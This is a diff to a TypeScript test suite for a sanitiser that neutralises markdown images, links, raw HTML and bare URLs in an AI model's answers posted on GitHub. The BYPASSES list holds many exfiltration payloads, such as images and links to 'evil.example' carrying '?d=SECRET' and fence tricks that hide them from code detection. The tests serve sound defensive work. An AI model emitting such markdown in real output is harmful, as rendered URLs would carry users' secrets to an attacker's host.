@@ -1,13 +1,15 @@
 /**
  * LUM-1154 acceptance — the model's answer is posted on GitHub, where an
  * image (or anything else fetched on render) could carry data out in its
- * URL. Every image / link construct must come out inert: no image renders,
- * and a link renders only to an allowlisted host (github.com, uselumo.ai);
- * any other URL is left as plain text. Code stays code.
+ * URL. Fail-safe: the dangerous constructs are neutralised EVERYWHERE, code
+ * included — any divergence between our idea of "code" and GitHub's parser
+ * would otherwise be a bypass (an indented closing fence, a code span across
+ * a paragraph or a table cell). A link renders only to an allowlisted host
+ * (github.com, uselumo.ai); any other URL is left as plain text.
  *
- * `renders` is a small CommonMark-ish oracle for the dangerous constructs:
- * an image `![…](…)` / `![…][…]` whose `!` is still syntax, a reference
- * definition, a link to a non-allowlisted host, or a raw HTML tag.
+ * `dangerous` checks the whole posted text — no code exemption — for: an
+ * image opener `![`, a reference definition `]:`, a raw HTML tag / autolink
+ * `<` + letter / `/` / `!` / `?`, and a link `](` off the allowlist.
  */
 import {
   CHAT_ANSWER_MAX_CHARS,
@@ -16,37 +18,28 @@ import {
 
 const EVIL = 'evil.example'
 
-/** Prose of a posted answer: fenced code blocks dropped (they render as code). */
-function proseOf(md: string): string {
-  const out: string[] = []
-  let fence: { ch: string; len: number } | null = null
-  for (const line of md.split('\n')) {
-    if (fence) {
-      if (new RegExp(`^${fence.ch}{${fence.len},}\\s*$`).test(line))
-        fence = null
-      continue
-    }
-    const m = /^(`{3,}|~{3,})(.*)$/.exec(line)
-    if (m && !(m[1]![0] === '`' && m[2]!.includes('`'))) {
-      fence = { ch: m[1]![0]!, len: m[1]!.length }
-      continue
-    }
-    out.push(line)
-  }
-  return out.join('\n')
-}
-
 function dangerous(md: string): string[] {
-  const prose = proseOf(md)
   const hits: string[] = []
   // An image: `!` (not an entity, not backslash-escaped) right before `[`.
-  if (/(^|[^\\])!\[/.test(prose)) hits.push('image')
+  if (/(^|[^\\])!\[/.test(md)) hits.push('image')
   // A reference definition (`[label]:` with a literal colon).
-  if (/\]:/.test(prose)) hits.push('reference definition')
-  // A raw HTML tag.
-  if (/<\/?[A-Za-z]/.test(prose)) hits.push('html tag')
+  if (/\]:/.test(md)) hits.push('reference definition')
+  // A raw HTML tag, comment / declaration, or an autolink.
+  if (/<[A-Za-z/!?]/.test(md)) hits.push('html tag or autolink')
+  // A bare URL GitHub would autolink, off the allowlist.
+  for (const m of md.matchAll(
+    /\b(?:https?|ftp):\/\/[^\s)>\]]*|\bwww\.[^\s)>\]]*/gi
+  )) {
+    const url = m[0].startsWith('www.') ? `https://${m[0]}` : m[0]
+    if (
+      !/^https:\/\/(?:[a-z0-9-]+\.)*(?:github\.com|uselumo\.ai)(?:[/?#]|$)/i.test(
+        url
+      )
+    )
+      hits.push(`bare url ${m[0]}`)
+  }
   // An inline link whose destination is not on an allowlisted host.
-  for (const m of prose.matchAll(/\]\(\s*<?([^)\s>]*)/g)) {
+  for (const m of md.matchAll(/\]\(\s*<?([^)\s>]*)/g)) {
     const dest = m[1] ?? ''
     if (
       !/^https:\/\/(?:[a-z0-9-]+\.)*(?:github\.com|uselumo\.ai)(?:[/?#]|$)/i.test(
@@ -57,6 +50,9 @@ function dangerous(md: string): string[] {
   }
   return hits
 }
+
+/** What a reader sees: the inert separator is invisible. */
+const visible = (md: string) => md.replace(/\u2060/g, '')
 
 const BYPASSES: Array<[string, string]> = [
   ['inline image', `Look: ![x](https://${EVIL}/p.png?d=SECRET)`],
@@ -99,6 +95,8 @@ const BYPASSES: Array<[string, string]> = [
   ['autolink in an image', `![<https://${EVIL}/a.png>](https://${EVIL}/a.png)`],
   ['link to a non-allowlisted host', `[docs](https://${EVIL}/?d=SECRET)`],
   ['link with lookalike host', `[x](https://github.com.${EVIL}/a)`],
+  ['bare url (autolinked by GitHub)', `see https://${EVIL}/?d=SECRET`],
+  ['bare www url', `see www.${EVIL}/?d=SECRET`],
   [
     'fake fence (backtick in info string) hiding an image',
     '```js`x\n![x](https://' + EVIL + '/f.png)\n```',
@@ -114,6 +112,40 @@ const BYPASSES: Array<[string, string]> = [
     'a `` x ` ![i](https://' + EVIL + '/c.png)',
   ],
   ['escaped backslash before image', `\\\\![x](https://${EVIL}/b.png)`],
+  // Manual review of eb8a132: code detection that diverges from GitHub's.
+  [
+    'indented closing fence',
+    '```\ncode\n   ```\n![x](https://' + EVIL + '/i.png)\n',
+  ],
+  [
+    'indented closing tilde fence',
+    '~~~\ncode\n  ~~~\n![x](https://' + EVIL + '/t.png)\n',
+  ],
+  [
+    'indented opening fence',
+    '   ```\n![x](https://' + EVIL + '/o.png)\n   ```',
+  ],
+  [
+    'code span across a paragraph break',
+    'a `x\n\n![i](https://' + EVIL + '/p.png)\n\n` b',
+  ],
+  [
+    'code span across table cells',
+    '| a | b |\n|---|---|\n| `x | ![i](https://' + EVIL + '/c.png) | y` |',
+  ],
+  ['inside a fenced block', '```\n![x](https://' + EVIL + '/f.png)\n```'],
+  ['inside a tilde block', '~~~md\n![x](https://' + EVIL + '/f.png)\n~~~'],
+  [
+    'inside an indented code block',
+    'x\n\n    ![x](https://' + EVIL + '/f.png)',
+  ],
+  ['inside inline code', 'see `![x](https://' + EVIL + '/f.png)`'],
+  ['html inside code', '```\n<img src="https://' + EVIL + '/i.png">\n```'],
+  ['autolink', `see <https://${EVIL}/a>`],
+  [
+    'reference definition inside code',
+    '```\n[r]: https://' + EVIL + '\n```\n![a][r]',
+  ],
 ]
 
 describe('answer sanitisation neutralises image / link exfiltration', () => {
@@ -123,18 +155,12 @@ describe('answer sanitisation neutralises image / link exfiltration', () => {
     expect(dangerous(out!)).toEqual([])
   })
 
-  it('a real code block is left as code, images inside it included', () => {
+  it('code reads the same to a person (the separator is invisible)', () => {
     const raw =
-      'Fix:\n```rust\nlet v = vec![1, 2];\nlet img = "![x](https://evil.example/c.png)";\n```\nDone.'
+      'Fix:\n```rust\nlet v = vec![1, 2];\nlet g: Vec<u8> = x;\n```\nUse `vec![0; n]` and `Map<K, V>`.'
     const out = cleanChatAnswer(raw)!
-    expect(out).toContain('let v = vec![1, 2];')
-    expect(out).toContain('"![x](https://evil.example/c.png)"')
-  })
-
-  it('inline code is left as code', () => {
-    expect(cleanChatAnswer('Use `vec![0; n]` and `Map<K, V>`.')).toBe(
-      'Use `vec![0; n]` and `Map<K, V>`.'
-    )
+    expect(dangerous(out)).toEqual([])
+    expect(visible(out)).toBe(raw)
   })
 
   it('links to github.com / uselumo.ai stay links', () => {
@@ -145,15 +171,17 @@ describe('answer sanitisation neutralises image / link exfiltration', () => {
     expect(out).toContain('[Lumo](https://www.uselumo.ai/docs)')
   })
 
-  it('a URL that is not allowlisted survives as plain text', () => {
-    const out = cleanChatAnswer('[docs](https://example.com/a)')!
-    expect(out).toContain('https://example.com/a')
+  it('a URL that is not allowlisted survives as plain, unlinked text', () => {
+    const out = cleanChatAnswer(
+      '[docs](https://example.com/a) www.example.com'
+    )!
+    expect(visible(out)).toBe('[docs](https://example.com/a) www.example.com')
     expect(dangerous(out)).toEqual([])
   })
 
   it('generics in prose still read as generics', () => {
-    expect(cleanChatAnswer('Returns Map<string, number>.')).toBe(
-      'Returns Map&lt;string, number>.'
+    expect(visible(cleanChatAnswer('Returns Map<string, number>.')!)).toBe(
+      'Returns Map<string, number>.'
     )
   })
 
